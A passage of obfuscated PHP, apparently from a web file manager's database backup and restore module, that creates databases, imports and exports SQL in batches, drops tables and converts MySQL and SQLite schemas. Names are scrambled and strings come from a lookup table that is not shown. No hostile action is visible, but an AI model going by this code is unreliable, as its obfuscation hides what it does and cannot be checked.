$³Î¨êÀö[$Úíİ¢ş˜[1020]]; $³Î¨êÀö[$Úíİ¢ş˜[1020]] = substr($÷ÒµãÕÉ, 0, strrpos($÷ÒµãÕÉ, $Úíİ¢ş˜[1106])); } $this->database = $³Î¨êÀö; $ê«¦ÙÛù = $this->model()->db(); try { $ü¤š…”´ = $ê«¦ÙÛù->execute("\163\150\157\167\x20\144\x61\164\x61\x62\141\163\x65\163\x20\154\151\x6b\x65\40\47{$·¿¶‡Ë½}\47"); } catch (Exception $‰Ğããµ) { } if (!$ü¤š…”´) { $ê«¦ÙÛù->execute("\x63\x72\145\x61\x74\145\x20\144\x61\164\141\142\141\163\145\40\x60{$·¿¶‡Ë½}\x60"); } $³Î¨êÀö[$Úíİ¢ş˜[1019]] = $·¿¶‡Ë½; if ($³Î¨êÀö[$Úíİ¢ş˜[1014]] == $Úíİ¢ş˜[1011]) { $³Î¨êÀö[$Úíİ¢ş˜[1020]] .= $Úíİ¢ş˜[1106] . $·¿¶‡Ë½; } $this->database = $³Î¨êÀö; $ê«¦ÙÛù->execute("\165\x73\145\x20\x60{$·¿¶‡Ë½}\140"); return $ê«¦ÙÛù; } public function createTable($»«æÒìû, &$Š¤ñ„ì) { $©ç¢ÇëÁ =& $_SERVER[ò«¥Ê‡å]; if (!IO::exist($»«æÒìû)) { ActionCall($©ç¢ÇëÁ[1107], !0, 0); show_json(LNG($©ç¢ÇëÁ[1108]), !1); } $áËèŒÑ± = $this->model()->db(); $„Ô Ñ” = sqlSplit(IO::getContent($»«æÒìû)); foreach ($„Ô Ñ” as $É¶Ş‡ƒ“) { $¶·œ·İÙ = stripos($É¶Ş‡ƒ“, $©ç¢ÇëÁ[1109]) === 0; if ($¶·œ·İÙ) { $Š¤ñ„ì->task[$©ç¢ÇëÁ[825]] += 1; } $áËèŒÑ±->execute($É¶Ş‡ƒ“); if ($¶·œ·İÙ) { preg_match($©ç¢ÇëÁ[1110], $É¶Ş‡ƒ“, $¦ú›½çù); $Š¤ñ„ì->task[$©ç¢ÇëÁ[1111]] = $¦ú›½çù[1]; $Š¤ñ„ì->update(1); } } } public function insertTable($ÊØÄÚæê, &$ÌşÎ®Óì) { $€£Æ±Şç =& $_SERVER[ò«¥Ê‡å]; $×â„Òğİ = $this->model()->db(); $«®Êùí— = $‘ÛÙòßÉ ? array($‘ÛÙòßÉ) : $×â„Òğİ->getTables(); foreach ($ÊØÄÚæê as $óÓ–ˆ¸Ã) { $‘ÛÙòßÉ = basename($óÓ–ˆ¸Ã, $€£Æ±Şç[827]); if (!in_array($‘ÛÙòßÉ, $«®Êùí—)) { continue; } $ÌşÎ®Óì->task[$€£Æ±Şç[1111]] = $‘ÛÙòßÉ; if (get_filesize($óÓ–ˆ¸Ã) == 0) { continue; } $Õ¨¨¶Ÿï = $this->sqlToDb($óÓ–ˆ¸Ã, $ÌşÎ®Óì); if (!$Õ¨¨¶Ÿï) { ActionCall($€£Æ±Şç[1107], !0, 0); show_json(LNG($€£Æ±Şç[1112]) . "\133{$‘ÛÙòßÉ}\135", !1); } } } public function sqlFromDb($”ÖŒƒáá, $ñâÇş®œ, &$ç¦ú–ÎÓ, $µŸó£¢æ = '') { if ($ç¦ú–ÎÓ) { $ç¦ú–ÎÓ->task[$_SERVER[ò«¥Ê‡å][1111]] = $”ÖŒƒáá; } $¢ôœ¨Îú = $this->model($”ÖŒƒáá); $æÍ½¡ü‹ = 0; $²Ìò©Äø = 0; $ñ´åëäˆ = 10000; $‚£…Óñô = fopen($ñâÇş®œ, $_SERVER[ò«¥Ê‡å][1113]); $ÖŞÎ“÷­ = $¢ôœ¨Îú->getPk(); $°­÷ ¼À = $¢ôœ¨Îú->getDbFields(); $¼Äı—¢» = $_SERVER[ò«¥Ê‡å][12]; if ($GLOBALS[$_SERVER[ò«¥Ê‡å][826]] && in_array($”ÖŒƒáá, array($_SERVER[ò«¥Ê‡å][1114], $_SERVER[ò«¥Ê‡å][1115]))) { $¼Äı—¢» = $”ÖŒƒáá; } do { $ı¢åüâœ = array($ÖŞÎ“÷­ => array($_SERVER[ò«¥Ê‡å][1061], $²Ìò©Äø)); $Šá½¯¶ = $¢ôœ¨Îú->where($ı¢åüâœ)->field($°­÷ ¼À)->order($ÖŞÎ“÷­ . $_SERVER[ò«¥Ê‡å][1116])->limit($ñ´åëäˆ)->select(); $Šá½¯¶ = !empty($Šá½¯¶) ? $Šá½¯¶ : array(); if (!($ğ¿¾êÛ” = count($Šá½¯¶))) { break; } $ù¯â¯ = end($Šá½¯¶); $²Ìò©Äø = $ù¯â¯[$ÖŞÎ“÷­]; $ÍÙ¤½ê = array(); foreach ($Šá½¯¶ as $­ƒÃóø) { if ($¼Äı—¢») { if ($”ÖŒƒáá == $_SERVER[ò«¥Ê‡å][1114]) { if ($­ƒÃóø[$_SERVER[ò«¥Ê‡å][33]] == $_SERVER[ò«¥Ê‡å][1117]) { $ø›ç”‘÷ = json_decode($­ƒÃóø[$_SERVER[ò«¥Ê‡å][420]], !0); if ($ø›ç”‘÷[$_SERVER[ò«¥Ê‡å][32]] == $GLOBALS[$_SERVER[ò«¥Ê‡å][826]] && $ø›ç”‘÷[$_SERVER[ò«¥Ê‡å][789]] != 1) { continue; } } } else { if ($­ƒÃóø[$_SERVER[ò«¥Ê‡å][33]] == $_SERVER[ò«¥Ê‡å][1118] && $­ƒÃóø[$_SERVER[ò«¥Ê‡å][96]] == $_SERVER[ò«¥Ê‡å][818]) { continue; } } } if ($µŸó£¢æ) { $­ƒÃóø[$_SERVER[ò«¥Ê‡å][86]] = "\x7b\151\x6f\72{$µŸó£¢æ}\175" . substr($­ƒÃóø[$_SERVER[ò«¥Ê‡å][86]], strlen("\x7b\x69\x6f\x3a{$­ƒÃóø[$_SERVER[ò«¥Ê‡å][863]]}\175")); $­ƒÃóø[$_SERVER[ò«¥Ê‡å][863]] = $µŸó£¢æ; } $ÍÙ¤½ê[] = $_SERVER[ò«¥Ê‡å][1119] . $this->sqlEncode($­ƒÃóø) . $_SERVER[ò«¥Ê‡å][1120]; } $İ€Äë³ú = "\111\116\123\105\x52\124\x20\111\x4e\x54\117\40\140{$”ÖŒƒáá}\140\40\50\x60" . implode($_SERVER[ò«¥Ê‡å][1121], $°­÷ ¼À) . $_SERVER[ò«¥Ê‡å][1122]; fwrite($‚£…Óñô, $İ€Äë³ú . implode($_SERVER[ò«¥Ê‡å][1123], $ÍÙ¤½ê) . $_SERVER[ò«¥Ê‡å][73] . PHP_EOL); $æÍ½¡ü‹ += $ğ¿¾êÛ”; if ($ç¦ú–ÎÓ) { $ç¦ú–ÎÓ->update($ğ¿¾êÛ”); } } while ($ñ´åëäˆ == $ğ¿¾êÛ”); fclose($‚£…Óñô); return $æÍ½¡ü‹; } public function sqlToDb($ÉÇÑÁ£‚, &$Â¨‹ºÂÜ) { $ß§©×ñó =& $_SERVER[ò«¥Ê‡å]; $İÍ“¬ú  = $this->model()->db(); $²»…ÃØ = @fopen($ÉÇÑÁ£‚, $ß§©×ñó[1124]); if (!$²»…ÃØ) { return !1; } $Ü…ş’ÜĞ = 0; $Œ„ôÁ–ø = $ß§©×ñó[12]; $ÊÔ©Í  = array(); $ªšÙ–Í’ = $this->dbType(); $¹İÌÃé = $ªšÙ–Í’ == $ß§©×ñó[13] ? 500 : 2000; $ÈÁı = basename($ÉÇÑÁ£‚, $ß§©×ñó[827]); $òĞÏÙïÔ = 0; $ÇË³âØ» = 4194304 - 104858; $«ï‚‚ıã = 1000000 - 104858; while (!feof($²»…ÃØ)) { $ÅÓ£›Ÿº = trim(fgets($²»…ÃØ)); if (!$ÅÓ£›Ÿº) { continue; } $êİÄÊÃ = $this->sqlDecode($ÅÓ£›Ÿº, $ªšÙ–Í’, $ÈÁı); if (stripos($êİÄÊÃ, $ß§©×ñó[401]) === 0) { if (!$Œ„ôÁ–ø) { $Œ„ôÁ–ø = $êİÄÊÃ . $ß§©×ñó[53]; } continue; } if ($Â¨‹ºÂÜ) { $Â¨‹ºÂÜ->task[$ß§©×ñó[825]] += 1; } $Ü…ş’ÜĞ++; $ÊÔ©Í [] = rtrim(rtrim(trim($êİÄÊÃ), $ß§©×ñó[50]), $ß§©×ñó[73]); $³çœ­õ = null; $íÈ¤”¥â = strlen($êİÄÊÃ); $òĞÏÙïÔ += $íÈ¤”¥â; if ($òĞÏÙïÔ >= ($¹İÌÃé == 500 ? $«ï‚‚ıã : $ÇË³âØ»)) { $³çœ­õ = array_pop($ÊÔ©Í ); if ($Ü…ş’ÜĞ > 1) { $Ü…ş’ÜĞ--; } } if ($Ü…ş’ÜĞ >= $¹İÌÃé || $³çœ­õ) { $êİÄÊÃ = $Œ„ôÁ–ø . implode($ß§©×ñó[50], $ÊÔ©Í ); if (!$İÍ“¬ú ->execute($êİÄÊÃ)) { return !1; } if ($Â¨‹ºÂÜ) { $Â¨‹ºÂÜ->update($Ü…ş’ÜĞ); } $ÊÔ©Í  = array(); $Ü…ş’ÜĞ = 0; $òĞÏÙïÔ = 0; if ($³çœ­õ) { $ÊÔ©Í  = array($³çœ­õ); $Ü…ş’ÜĞ = 1; $òĞÏÙïÔ = $íÈ¤”¥â; } } } fclose($²»…ÃØ); if (!empty($ÊÔ©Í )) { $êİÄÊÃ = $Œ„ôÁ–ø . implode($ß§©×ñó[50], $ÊÔ©Í ); if (!$İÍ“¬ú ->execute($êİÄÊÃ)) { return !1; } if ($Â¨‹ºÂÜ) { $Â¨‹ºÂÜ->update($Ü…ş’ÜĞ); } } return !0; } public function dropTable($òÕè®Ö = null) { $şÍìÛÏ = $this->model()->db(); $çáÙİ«Å = $òÕè®Ö ? array($òÕè®Ö) : $şÍìÛÏ->getTables(); if (!$çáÙİ«Å) { return; } foreach ($çáÙİ«Å as $òÕè®Ö) { if ($òÕè®Ö) { $òÕè®Ö = strtolower($òÕè®Ö); } else { continue; } $şÍìÛÏ->execute("\144\162\157\160\40\x74\x61\142\154\x65\40\151\x66\40\145\x78\x69\163\x74\163\x20\140{$òÕè®Ö}\140"); } } private function sqlEncode($»Ì¸ÙÈª) { $Àİü‡Ã¿ =& $_SERVER[ò«¥Ê‡å]; $ç»ã™” = array(); foreach ($»Ì¸ÙÈª as $×ÏÅĞ¨ú) { if (is_array($×ÏÅĞ¨ú)) { $×ÏÅĞ¨ú = json_encode_force($×ÏÅĞ¨ú); } $×ÏÅĞ¨ú = addslashes($×ÏÅĞ¨ú); $×ÏÅĞ¨ú = str_replace(array($Àİü‡Ã¿[1125], $Àİü‡Ã¿[248]), array($Àİü‡Ã¿[1126], $Àİü‡Ã¿[1127]), $×ÏÅĞ¨ú); $ç»ã™”[] = str_replace($Àİü‡Ã¿[58], $Àİü‡Ã¿[1128], $×ÏÅĞ¨ú); } return $Àİü‡Ã¿[58] . implode($Àİü‡Ã¿[1129], $ç»ã™”) . $Àİü‡Ã¿[58]; } private function sqlDecode($ª‹×ƒõ—, $™¢Èšæ, $×Ù›ô¿ê = '') { $àÇ»¤«ä =& $_SERVER[ò«¥Ê‡å]; $ª‹×ƒõ— = str_replace(array($àÇ»¤«ä[1126], $àÇ»¤«ä[1127]), array($àÇ»¤«ä[1125], $àÇ»¤«ä[248]), $ª‹×ƒõ—); if ($™¢Èšæ == $àÇ»¤«ä[13]) { return $×Ù›ô¿ê != $àÇ»¤«ä[1130] ? stripslashes($ª‹×ƒõ—) : $ª‹×ƒõ—; } if ($×Ù›ô¿ê == $àÇ»¤«ä[1130]) { $ª‹×ƒõ— = str_replace($àÇ»¤«ä[1131], $àÇ»¤«ä[120], stripslashes($ª‹×ƒõ—)); } return $ª‹×ƒõ—; } public function getSqlFile($®ßÙÄ = '') { $ØÎ¸ËÅ =& $_SERVER[ò«¥Ê‡å]; $®€ñöø¹ = $this->dbType(!0); $İş¡ë¥ = CONTROLLER_DIR . "\151\x6e\163\164\x61\x6c\x6c\x2f\x64\141\164\x61\x2f{$®€ñöø¹}\x2e\163\161\x6c"; $×óŒ´Õş = file_get_contents($İş¡ë¥); $ŞŒÓ•— = $ØÎ¸ËÅ[1132] . ($®€ñöø¹ == $ØÎ¸ËÅ[850] ? $ØÎ¸ËÅ[1133] : $ØÎ¸ËÅ[1134]) . $ØÎ¸ËÅ[1135]; preg_match_all($ŞŒÓ•—, $×óŒ´Õş, $ı¡Ñøé); $Úø÷ˆ´ = $ı¡Ñøé[1]; $ü”“¡İå = $this->model()->db(); $ªÎÑâå‹ = $ü”“¡İå->getTables(); $æ’©ªØ¿ = TEMP_FILES . $ØÎ¸ËÅ[1136] . date($ØÎ¸ËÅ[257]) . $ØÎ¸ËÅ[8]; del_dir($æ’©ªØ¿); mk_dir($æ’©ªØ¿); $¹‰ÁÊùş = $æ’©ªØ¿ . $ØÎ¸ËÅ[1137]; $ùù§ˆÏ = $æ’©ªØ¿ . $ØÎ¸ËÅ[1138]; $Ò¾üÄé = $®€ñöø¹ == $ØÎ¸ËÅ[13] ? $ØÎ¸ËÅ[850] : $ØÎ¸ËÅ[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\164\x61\154\154\57\144\x61\164\141\57{$Ò¾üÄé}\56\163\x71\x6c", $æ’©ªØ¿); @touch($æ’©ªØ¿ . $®€ñöø¹ . $ØÎ¸ËÅ[827]); $Ü¿”ğÕ = fopen($¹‰ÁÊùş, $ØÎ¸ËÅ[1113]); $³±…ÂÏ½ = fopen($ùù§ˆÏ, $ØÎ¸ËÅ[1113]); if ($®€ñöø¹ == $ØÎ¸ËÅ[13]) { $ªÎÑâå‹ = array_diff($ªÎÑâå‹, array($ØÎ¸ËÅ[823], $ØÎ¸ËÅ[824])); $ ÖÕòâù = array($ØÎ¸ËÅ[1139], $ØÎ¸ËÅ[1140], $ØÎ¸ËÅ[1141]); fwrite($³±…ÂÏ½, implode(PHP_EOL, $ ÖÕòâù) . PHP_EOL . PHP_EOL); foreach ($ªÎÑâå‹ as $ßÂ›è…ä) { $ƒåÊ‹Ì = $this->sqlFromSqlite($ßÂ›è…ä); if (!$ƒåÊ‹Ì[$ØÎ¸ËÅ[13]]) { continue; } fwrite($³±…ÂÏ½, $ƒåÊ‹Ì[$ØÎ¸ËÅ[13]] . PHP_EOL . PHP_EOL); if (!in_array($ßÂ›è…ä, $Úø÷ˆ´)) { fwrite($Ü¿”ğÕ, $ƒåÊ‹Ì[$ØÎ¸ËÅ[850]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ªÎÑâå‹ as $ßÂ›è…ä) { $ƒåÊ‹Ì = $this->sqlFromMysql($ßÂ›è…ä); if (!$ƒåÊ‹Ì[$ØÎ¸ËÅ[850]]) { continue; } fwrite($Ü¿”ğÕ, $ƒåÊ‹Ì[$ØÎ¸ËÅ[850]] . PHP_EOL . PHP_EOL); if (!in_array($ßÂ›è…ä, $Úø÷ˆ´)) { fwrite($³±…ÂÏ½, $ƒåÊ‹Ì[$ØÎ¸ËÅ[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ü¿”ğÕ); fclose($³±…ÂÏ½); $×óŒ´Õş = array($ØÎ¸ËÅ[850] => $¹‰ÁÊùş, $ØÎ¸ËÅ[13] => $ùù§ˆÏ); return $®ßÙÄ ? $×óŒ´Õş[$®ßÙÄ] : $×óŒ´Õş; } public function dbType($¿áœØ®Œ = false) { $Æ’ÙãÖÈ =& $_SERVER[ò«¥Ê‡å]; $ÈçÌ÷ùğ = $¿áœØ®Œ ? $GLOBALS[$Æ’ÙãÖÈ[6]][$Æ’ÙãÖÈ[21]] : $this->database; $ÈçÌ÷ùğ = array_change_key_case($ÈçÌ÷ùğ); $¥´Ò´ùÌ = $ÈçÌ÷ùğ[$Æ’ÙãÖÈ[1014]]; if ($¥´Ò´ùÌ == $Æ’ÙãÖÈ[1011]) { $Ä¥şä®¯ = explode($Æ’ÙãÖÈ[4], $ÈçÌ÷ùğ[$Æ’ÙãÖÈ[1020]]); $¥´Ò´ùÌ = $Ä¥şä®¯[0]; } $Â¹şñ® = array($Æ’ÙãÖÈ[1142] => $Æ’ÙãÖÈ[13], $Æ’ÙãÖÈ[959] => $Æ’ÙãÖÈ[850]); if (isset($Â¹şñ®[$¥´Ò´ùÌ])) { $¥´Ò´ùÌ = $Â¹şñ®[$¥´Ò´ùÌ]; } return $¥´Ò´ùÌ; } public function sqlFromMysql($º‚Úõó, $¿„ÜãÜ€ = '') { $öÁ¹öÌ =& $_SERVER[ò«¥Ê‡å]; $Øµº¼ñå = $this->model()->db(); $ä¡“ï˜¬ = $Øµº¼ñå->query($öÁ¹öÌ[1143] . $º‚Úõó . $öÁ¹öÌ[431]); if (!$ä¡“ï˜¬ || !$ä¡“ï˜¬[0]) { return !1; } $÷ò ÈÙ¿ = _get($ä¡“ï˜¬[0], $öÁ¹öÌ[1144], $öÁ¹öÌ[12]); if (!$÷ò ÈÙ¿) { return !1; } $€Õ€èÉÌ = "\x44\x52\x4f\x50\x20\124\x41\x42\x4c\105\40\x49\x46\x20\105\130\111\123\x54\x53\x20\140{$º‚Úõó}\x60\73" . PHP_EOL . $÷ò ÈÙ¿ . $öÁ¹öÌ[73]; if ($¿„ÜãÜ€ && $¿„ÜãÜ€ == $öÁ¹öÌ[850]) { return $€Õ€èÉÌ; } $°¤½õãÔ = array_change_key_case($GLOBALS[$öÁ¹öÌ[6]][$öÁ¹öÌ[21]]); $±»¹•â  = $°¤½õãÔ[$öÁ¹öÌ[1019]]; $Ø¥¤“Ã÷ = $öÁ¹öÌ[1145] . $±»¹•â  . $öÁ¹öÌ[1146] . $º‚Úõó . $öÁ¹öÌ[58]; $ó§ó’äæ = $öÁ¹öÌ[1147] . $º‚Úõó . $öÁ¹öÌ[947]; $£•½«ãß = $Øµº¼ñå->query($Ø¥¤“Ã÷); if (empty($£•½«ãß)) { $å˜µ¸ô¤ = array($öÁ¹öÌ[850] => $öÁ¹öÌ[12], $öÁ¹öÌ[13] => $öÁ¹öÌ[12]); return $¿„ÜãÜ€ ? $å˜µ¸ô¤[$¿„ÜãÜ€] : $å˜µ¸ô¤; } $…çÔäÎ˜ = $Øµº¼ñå->query($ó§ó’äæ); $Ÿ¨À™œ¹ = $öÁ¹öÌ[12]; $Âãıé¥Á = array(); foreach ($…çÔäÎ˜ as $Ğşó‰¾€) { if (!$Ÿ¨À™œ¹ && $Ğşó‰¾€[$öÁ¹öÌ[1148]] == $öÁ¹öÌ[1149]) { $Ÿ¨À™œ¹ = $Ğşó‰¾€[$öÁ¹öÌ[1150]]; } if (isset($Âãıé¥Á[$Ğşó‰¾€[$öÁ¹öÌ[1148]]])) { $Âãıé¥Á[$Ğşó‰¾€[$öÁ¹öÌ[1148]]][$öÁ¹öÌ[1151]][] = $Ğşó‰¾€[$öÁ¹öÌ[1150]]; continue; } $Âãıé¥Á[$Ğşó‰¾€[$öÁ¹öÌ[1148]]] = array($öÁ¹öÌ[1152] => $Ğşó‰¾€[$öÁ¹öÌ[1148]], $öÁ¹öÌ[1151] => array($Ğşó‰¾€[$öÁ¹öÌ[1150]]), $öÁ¹öÌ[1153] => $Ğşó‰¾€[$öÁ¹öÌ[1154]] == $öÁ¹öÌ[90] ? 0 : 1); } $Ö¡µ•Œ = array(); foreach ($Âãıé¥Á as $Ğşó‰¾€) { $Öì±¢¡÷ = $Ğşó‰¾€[$öÁ¹öÌ[1152]] == $öÁ¹öÌ[1149]; $­§â¡¦ê = array($öÁ¹öÌ[1155], $Ğşó‰¾€[$öÁ¹öÌ[1153]] == $öÁ¹öÌ[90] && !$Öì±¢¡÷ ? $öÁ¹öÌ[1156] : $öÁ¹öÌ[12], $öÁ¹öÌ[1157], $öÁ¹öÌ[1158] . $º‚Úõó . $öÁ¹öÌ[11] . ($Öì±¢¡÷ ? $öÁ¹öÌ[1159] : $Ğşó‰¾€[$öÁ¹öÌ[1152]]) . $öÁ¹öÌ[120], $öÁ¹öÌ[1160], $öÁ¹öÌ[120] . $º‚Úõó . $öÁ¹öÌ[120], $öÁ¹öÌ[1161] . implode($öÁ¹öÌ[1162], $Ğşó‰¾€[$öÁ¹öÌ[1151]]) . $öÁ¹öÌ[1163]); $Ö¡µ•Œ[] = implode($öÁ¹öÌ[53], $­§â¡¦ê) . $öÁ¹öÌ[73]; } $¬ç­¿µÙ = array(); $¹¬è¹™š = array($öÁ¹öÌ[1164] => $öÁ¹öÌ[1165], $öÁ¹öÌ[1165] => $öÁ¹öÌ[1165], $öÁ¹öÌ[334] => $öÁ¹öÌ[361], $öÁ¹öÌ[333] => $öÁ¹öÌ[361]); foreach ($£•½«ãß as $Ğşó‰¾€) { $­§â¡¦ê = array($öÁ¹öÌ[120] . $Ğşó‰¾€[$öÁ¹öÌ[1166]] . $öÁ¹öÌ[120], isset($¹¬è¹™š[$Ğşó‰¾€[$öÁ¹öÌ[1167]]]) ? $¹¬è¹™š[$Ğşó‰¾€[$öÁ¹öÌ[1167]]] : $Ğşó‰¾€[$öÁ¹öÌ[1168]], $Ğşó‰¾€[$öÁ¹öÌ[1169]] == $öÁ¹öÌ[945] ? $öÁ¹öÌ[1170] : $öÁ¹öÌ[1171], $Ğşó‰¾€[$öÁ¹öÌ[1166]] == $Ÿ¨À™œ¹ ? $öÁ¹öÌ[1172] : $öÁ¹öÌ[12], $Ğşó‰¾€[$öÁ¹öÌ[996]] ? strtoupper(str_replace($öÁ¹öÌ[11], $öÁ¹öÌ[12], $Ğşó‰¾€[$öÁ¹öÌ[996]])) : $öÁ¹öÌ[12]); $¬ç­¿µÙ[] = trim(implode($öÁ¹öÌ[53], $­§â¡¦ê)); } $–¦ıÆ¸è = array($öÁ¹öÌ[1173] . $º‚Úõó . $öÁ¹öÌ[1174], $öÁ¹öÌ[1175] . $º‚Úõó . $öÁ¹öÌ[1176], implode($öÁ¹öÌ[50] . PHP_EOL, $¬ç­¿µÙ), $öÁ¹öÌ[993]); $Øà‘«ÎÉ = implode(PHP_EOL, array_merge($–¦ıÆ¸è, $Ö¡µ•Œ)); if ($¿„ÜãÜ€ && $¿„ÜãÜ€ == $öÁ¹öÌ[13]) { return $Øà‘«ÎÉ; } $å˜µ¸ô¤ = array($öÁ¹öÌ[850] => $€Õ€èÉÌ, $öÁ¹öÌ[13] => $Øà‘«ÎÉ); return $¿„ÜãÜ€ ? $å˜µ¸ô¤[$¿„ÜãÜ€] : $å˜µ¸ô¤; } public function sqlFromSqlite($¬³ˆ¿Á, $¯ÊÓ—Üç = '') { $€›ãûÎ¢ =& $_SERVER[ò«¥Ê‡å]; $´ÒÖ•ï” = $this->model()->db(); $‘ª°ìÏ¯ = "\x50\x52\x41\107\x4d\x41\40\124\x41\x42\x4c\x45\137\x49\116\x46\117\40\50\x27{$¬³ˆ¿Á}\47\51"; $Ú„ÀŸ® = "\x53\x45\x4c\x45\103\x54\x20\52\40\x46\x52\117\x4d\x20\163\161\154\x69\164\x65\137\x6d\141\x73\x74\x65\x72\40\x57\110\105\122\x45\40\164\142\154\137\x6e\141\x6d\x65\x20\x3d\40\47{$¬³ˆ¿Á}\x27"; $‡ÔàÉŞ = $´ÒÖ•ï”->query($‘ª°ìÏ¯); if (empty($‡ÔàÉŞ)) { $±µ°³“¶ = array($€›ãûÎ¢[850] => $€›ãûÎ¢[12], $€›ãûÎ¢[13] => $€›ãûÎ¢[12]); return $¯ÊÓ—Üç ? $±µ°³“¶[$¯ÊÓ—Üç] : $±µ°³“¶; } $‡À½óŠ = $´ÒÖ•ï”->query($Ú„ÀŸ®); $Ğ¢Û³­ì = $£ˆµ‹Ê˜ = array(); foreach ($‡À½óŠ as $Èõ®™ø¹) { if ($Èõ®™ø¹[$€›ãûÎ¢[33]] == $€›ãûÎ¢[325]) { $Ğ¢Û³­ì[] = $Èõ®™ø¹[$€›ãûÎ¢[1177]]; } else { $£ˆµ‹Ê˜[$Èõ®™ø¹[$€›ãûÎ¢[32]]] = $Èõ®™ø¹[$€›ãûÎ¢[1177]]; } } $Øò–ƒò = array_merge(array($€›ãûÎ¢[1173] . $¬³ˆ¿Á . $€›ãûÎ¢[120]), $Ğ¢Û³­ì, array_values($£ˆµ‹Ê˜)); $Øò–ƒò = implode($€›ãûÎ¢[73] . PHP_EOL, $Øò–ƒò) . $€›ãûÎ¢[73]; if ($¯ÊÓ—Üç && $¯ÊÓ—Üç == $€›ãûÎ¢[13]) { return $Øò–ƒò; } $¯ßë²Æ = array(); $ºÍßıÓ = array($€›ãûÎ¢[1165] => $€›ãûÎ¢[1178], $€›ãûÎ¢[361] => $€›ãûÎ¢[1179]); $ÑÆ“¼Ó¶ = $€›ãûÎ¢[12]; foreach ($‡ÔàÉŞ as $Èõ®™ø¹) { if ($Èõ®™ø¹[$€›ãûÎ¢[57]] == $€›ãûÎ¢[90]) { $ÑÆ“¼Ó¶ = $Èõ®™ø¹[$€›ãûÎ¢[32]]; } $£ŞÏ«Ï = array($€›ãûÎ¢[431] . $Èõ®™ø¹[$€›ãûÎ¢[32]] . $€›ãûÎ¢[431], isset($ºÍßıÓ[$Èõ®™ø¹[$€›ãûÎ¢[33]]]) ? $ºÍßıÓ[$Èõ®™ø¹[$€›ãûÎ¢[33]]] : $Èõ®™ø¹[$€›ãûÎ¢[33]], $Èõ®™ø¹[$€›ãûÎ¢[35]] == $€›ãûÎ¢[90] ? $€›ãûÎ¢[1170] : $€›ãûÎ¢[1180] . $Èõ®™ø¹[$€›ãûÎ¢[56]], $Èõ®™ø¹[$€›ãûÎ¢[57]] == $€›ãûÎ¢[90] ? $€›ãûÎ¢[1181] : $€›ãûÎ¢[12]); $¯ßë²Æ[] = trim(implode($€›ãûÎ¢[53], $£ŞÏ«Ï)); } foreach ($£ˆµ‹Ê˜ as $ïŞ ¿³¾ => $Çå¨ÏöÑ) { $àçïëı = str_replace($€›ãûÎ¢[1182] . $¬³ˆ¿Á . $€›ãûÎ¢[11], $€›ãûÎ¢[12], $ïŞ ¿³¾); $êéööÒ¿ = str_replace(array($€›ãûÎ¢[120], $€›ãûÎ¢[1004]), $€›ãûÎ¢[431], substr($Çå¨ÏöÑ, stripos($Çå¨ÏöÑ, $€›ãûÎ¢[306]))); if ($àçïëı == $€›ãûÎ¢[1159]) { $İ“«¾öÛ = $€›ãûÎ¢[1183] . $ÑÆ“¼Ó¶ . $€›ãûÎ¢[1184]; } else { $İ“«¾öÛ = (stripos($àçïëı, $€›ãûÎ¢[11]) ? $€›ãûÎ¢[1185] : $€›ãûÎ¢[12]) . ($€›ãûÎ¢[1186] . $àçïëı . $€›ãûÎ¢[1187] . $êéööÒ¿); } $¯ßë²Æ[] = $İ“«¾öÛ; } $ÕïğˆƒŒ = array($€›ãûÎ¢[1188] . $¬³ˆ¿Á . $€›ãûÎ¢[1189], $€›ãûÎ¢[1190] . $¬³ˆ¿Á . $€›ãûÎ¢[1191], implode($€›ãûÎ¢[50] . PHP_EOL, $¯ßë²Æ), $€›ãûÎ¢[1192]); $©ˆò·âÚ = implode(PHP_EOL, $ÕïğˆƒŒ); if ($¯ÊÓ—Üç && $¯ÊÓ—Üç == $€›ãûÎ¢[850]) { return $©ˆò·âÚ; } $±µ°³“¶ = array($€›ãûÎ¢[850] => $©ˆò·âÚ, $€›ãûÎ¢[13] => $Øò–ƒò); return $¯ÊÓ—Üç ? $±µ°³“¶[$¯ÊÓ—Üç] : $±µ°³“¶; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ØğáŠƒ×, $¼«Á»å•) { $ç®·î¡Ì =& $_SERVER[ò«¥Ê‡å]; $••ĞÆÛ… = $¼«Á»å•; $GLOBALS[$ç®·î¡Ì[1193]] = $ç®·î¡Ì[1194] . $ØğáŠƒ×; Hook::trigger($ç®·î¡Ì[1194] . $ØğáŠƒ× . $ç®·î¡Ì[1195], $••ĞÆÛ…); $øºäÈ€ = self::driverMake($¼«Á»å•[0]); if (!$øºäÈ€) { return !1; } if (method_exists($øºäÈ€, $ØğáŠƒ×)) { $áÉ¿½ = @call_user_func_array(array($øºäÈ€, $ØğáŠƒ×), $¼«Á»å•); } else { if (method_exists($øºäÈ€, $ç®·î¡Ì[1196])) { $áÉ¿½ = @call_user_func_array(array($øºäÈ€, $ØğáŠƒ×), $¼«Á»å•); } else { if (method_exists(self, $ØğáŠƒ×)) { $áÉ¿½ = @call_user_func_array(array(self, $ØğáŠƒ×), $¼«Á»å•); } else { $áÉ¿½ = call_user_func_array(array(parent, $ØğáŠƒ×), $¼«Á»å•); } } } Hook::trigger($ç®·î¡Ì[1194] . $ØğáŠƒ× . $ç®·î¡Ì[1197], $••ĞÆÛ…, $áÉ¿½); return $áÉ¿½; } public static function init($ˆëõÑ¹) { return self::driverMake($ˆëõÑ¹); } public static function copy($Æ­É»·, $Õ©°‰Ñ‹, $áÀ­²ã„ = false, $ßúŞ‘Ş = false) { return self::copyMoveStart($Æ­É»·, $Õ©°‰Ñ‹, $áÀ­²ã„, $_SERVER[ò«¥Ê‡å][588], $ßúŞ‘Ş); } public static function move($£íŞ÷¹½, $Éé”Ğëµ, $˜¯¦ÃÀ¥ = false, $õê¦ûŞ‚ = false) { return self::copyMoveStart($£íŞ÷¹½, $Éé”Ğëµ, $˜¯¦ÃÀ¥, $_SERVER[ò«¥Ê‡å][590], $õê¦ûŞ‚); } private static function copyMoveStart($öáäÏº‰, $³ä¥Ñ±ª, $æåÄ”ïã, $ù×ôö¥Ñ, $°õ•Éƒ) { $ßóºä =& $_SERVER[ò«¥Ê‡å]; $™™·ãü = array($öáäÏº‰, $³ä¥Ñ±ª, $æåÄ”ïã, $°õ•Éƒ); Hook::trigger($ßóºä[1194] . $ù×ôö¥Ñ . $ßóºä[1195], $™™·ãü); $ú½¢é¬Ø = self::copyMove($öáäÏº‰, $³ä¥Ñ±ª, $æåÄ”ïã, 